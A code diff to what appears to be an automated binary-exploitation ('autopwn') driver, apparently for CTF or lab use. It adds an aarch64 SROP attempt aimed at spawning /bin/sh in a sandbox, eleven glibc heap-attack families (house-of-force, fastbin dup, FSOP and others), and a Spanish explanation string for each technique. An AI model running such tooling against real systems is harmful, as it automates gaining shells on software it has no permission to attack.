@@ -150,6 +150,22 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("srop", False, str(e)))
 
+    # combo A2b: SROP on aarch64 -- only even worth trying when recon's own arch says ARM;
+    # the driver itself also checks `elf.arch != "aarch64"` and degrades honestly, but gating it
+    # here avoids spawning a sandbox run for an x86-64 target that could never apply.
+    if run and want("srop-aarch64") and "arm" in (arch or "").lower() and not res.win_exploit:
+        log("[combo] SROP (aarch64): sigreturn -> execve('/bin/sh') (sandbox/qemu-aarch64)...")
+        try:
+            from .autosrop_aarch64 import autosrop_aarch64
+            ra = autosrop_aarch64(binary)
+            verdict = True if ra.get("verified") else (None if ra.get("ok") else False)
+            res.attempts.append(("srop-aarch64", verdict, ra.get("detail") or ra.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(ra.get("verified"))
+            log(f"[combo] SROP (aarch64) -> {'SHELL VERIFICADA' if ra.get('verified') else 'no verificado'}")
+            learn(f"srop-aarch64 verified={ra.get('verified')} {ra.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("srop-aarch64", False, str(e)))
+
     # combo A3: ret2csu -- gadget-poor binaries that still have the two universal
     # __libc_csu_init-style gadgets (sets rdi/rsi/rdx and makes an indirect call WITHOUT any
     # pop rsi/pop rdx of their own). Tried before the generic ROP sweep below, which would never
@@ -317,6 +333,17 @@ def autopwn(binary: str, config=None, store=None,
             from .autouaf import autouaf_shell, _uaf_applicable
             from .autotcachedup import autotcachedup_shell, _tcache_dup_applicable
             from .autowow import autowow_shell, _wow_applicable
+            from .autohof import autohof, _hof_applicable
+            from .autohos import autohos, _hos_applicable
+            from .autohoe import autohoe, _hoe_applicable
+            from .autobotcake import autobotcake, _botcake_applicable
+            from .autolargebin import autolargebin, _largebin_applicable
+            from .autohomind import autohomind, _homind_applicable
+            from .autoiofile import autoiofile, _iofile_applicable
+            from .autofastbindup import autofastbindup, _fastbindup_applicable
+            from .autounsafeunlink import autounsafeunlink, _unsafeunlink_applicable
+            from .autohoc import autohoc, _hoc_applicable
+            from .autostash import autostash, _stash_applicable
             heap_combos = []
             if want("heap-shell") and _heap_shell_applicable(binary):
                 heap_combos.append(("heap-shell", autoheap_shell, "tcache poison -> free@GOT=win"))
@@ -326,6 +353,31 @@ def autopwn(binary: str, config=None, store=None,
                 heap_combos.append(("tcache-dup", autotcachedup_shell, "tcache dup -> GOT=system"))
             if want("write-what-where") and _wow_applicable(binary):
                 heap_combos.append(("write-what-where", autowow_shell, "indice sin comprobar -> GOT=win"))
+            # glibc-internals families (cada una contra un asignador que reproduce la precondicion
+            # concreta que esa tecnica abusa -- house-of-force esta mitigado en glibc >=2.29, el
+            # resto no; ver el docstring de cada modulo).
+            if want("house-of-force") and _hof_applicable(binary):
+                heap_combos.append(("house-of-force", autohof, "top-chunk pre-2.29 -> top arbitrario -> hijack"))
+            if want("house-of-spirit") and _hos_applicable(binary):
+                heap_combos.append(("house-of-spirit", autohos, "chunk falso en tcache -> hijack"))
+            if want("house-of-einherjar") and _hoe_applicable(binary):
+                heap_combos.append(("house-of-einherjar", autohoe, "consolidacion hacia atras -> hijack"))
+            if want("house-of-botcake") and _botcake_applicable(binary):
+                heap_combos.append(("house-of-botcake", autobotcake, "doble-free via unsorted -> tcache poison"))
+            if want("largebin-attack") and _largebin_applicable(binary):
+                heap_combos.append(("largebin-attack", autolargebin, "insercion en largebin -> escritura de puntero"))
+            if want("house-of-mind") and _homind_applicable(binary):
+                heap_combos.append(("house-of-mind", autohomind, "ar_ptr forjado -> insercion en fastbin arbitraria"))
+            if want("iofile-fsop") and _iofile_applicable(binary):
+                heap_combos.append(("iofile-fsop", autoiofile, "vtable de _IO_FILE reapuntada -> __overflow(fp)"))
+            if want("fastbin-dup") and _fastbindup_applicable(binary):
+                heap_combos.append(("fastbin-dup", autofastbindup, "doble-free A,B,A (pre-safe-linking) -> fd envenenado"))
+            if want("unsafe-unlink") and _unsafeunlink_applicable(binary):
+                heap_combos.append(("unsafe-unlink", autounsafeunlink, "bypass del chequeo 2.3.4+ -> ptr cerca de si mismo"))
+            if want("house-of-corrosion") and _hoc_applicable(binary):
+                heap_combos.append(("house-of-corrosion", autohoc, "global_max_fast corrompido -> indice de fastbin sin cota"))
+            if want("tcache-stash") and _stash_applicable(binary):
+                heap_combos.append(("tcache-stash", autostash, "stash de smallbin->tcache -> chunk falso stashed"))
         except Exception as e:
             heap_combos = []
             log(f"[combo] heap-shell families no disponibles: {e}")
@@ -428,6 +480,8 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
                 else " sin canary -> retorno directo a win() (direccion fija)"))
     if "ret2libc" in t:
         return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
+    if "srop-aarch64" in t or ("srop" in t and "aarch64" in t):   # antes del 'srop' generico
+        return "binario aarch64 -> SROP: rt_sigreturn (svc #139) restaura un sigframe forjado y ejecuta execve('/bin/sh')"
     if "srop" in t:            # antes de 'rop' (substring): SROP es una tecnica distinta
         return "binario pobre en gadgets con gadget syscall + '/bin/sh' -> SROP: un rt_sigreturn restaura TODOS los registros desde un frame forjado y ejecuta execve('/bin/sh')"
     if "csu" in t:             # antes de 'rop' (substring): ret2csu es distinto del ROP generico
@@ -439,6 +493,28 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
                 + (" (PIE: base resuelta en sandbox)" if pie else ""))
     if "format" in t:
         return "printf(entrada) controlado -> escritura via %n (GOT o retorno segun RELRO)"
+    if "house-of-force" in t:
+        return "asignador con el carve de top-chunk pre-2.29 -> top-chunk corrompido a un tamano enorme desplaza `top` a una direccion elegida"
+    if "house-of-spirit" in t:
+        return "chunk falso 16-alineado liberado -> entra en el tcache -> una malloc del mismo tamano lo devuelve"
+    if "house-of-einherjar" in t:
+        return "PREV_INUSE limpio + prev_size forjado -> la consolidacion hacia atras hace que el chunk liberado aterrice en una direccion elegida"
+    if "house-of-botcake" in t:
+        return "doble-free A,A enrutado por la unsorted bin -> esquiva el chequeo de key del tcache -> chunks solapados"
+    if "largebin" in t:
+        return "chunk largebin con bk_nextsize corrupto -> la insercion ejecuta `bk_nextsize->fd_nextsize = victim`, una escritura de puntero elegida"
+    if "house-of-mind" in t:
+        return "ar_ptr del heap_info corrompido -> free() inserta en una arena falsa -> `fastbinsY[idx] = chunk` escribe en una direccion elegida"
+    if "iofile" in t or "fsop" in t:
+        return "vtable de un _IO_FILE reapuntada -> el flush de stream llama a vtable[__overflow](fp)"
+    if "fastbin-dup" in t:
+        return "doble-free A,B,A (pre-safe-linking) esquiva el chequeo debil ==fasttop -> fd envenenado hacia un chunk falso"
+    if "unsafe-unlink" in t:
+        return "fd/bk forjados satisfacen el chequeo >=2.3.4 (FD->bk==P && BK->fd==P) -> unlink() deja un puntero apuntando cerca de si mismo"
+    if "house-of-corrosion" in t:
+        return "global_max_fast corrompido -> un free() grande se trata como fastbin con indice sin cota -> escritura en una direccion elegida"
+    if "tcache-stash" in t:
+        return "bk de un chunk de smallbin corrompido a un chunk falso -> el stash loop lo mete en el tcache -> una alloc posterior lo devuelve"
     if "heap" in t or "tcache" in t or "uaf" in t:
         return "primitiva de heap (UAF/tcache) -> secuestro de puntero/GOT a win()/system"
     if "wow" in t or "write" in t:
